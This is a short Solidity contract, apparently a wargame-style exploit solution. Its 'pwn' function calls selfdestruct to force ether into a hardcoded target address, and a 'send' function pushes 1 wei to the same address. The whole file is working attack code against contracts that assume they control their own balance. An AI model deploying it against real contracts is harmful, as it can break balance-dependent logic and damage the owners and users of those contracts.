// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Voltorb {
    address contractAddress = 0x8b12087F7061C2f0ca4F37b22616d51fbF90E997;

    function send() public {
        bool sent = payable(contractAddress).send(1);
        require(sent, "Failure! Ether not sent");
    }

    function pwn() public {
        selfdestruct(payable(contractAddress));
    }

    fallback() external payable {}

    receive() external payable {}
}
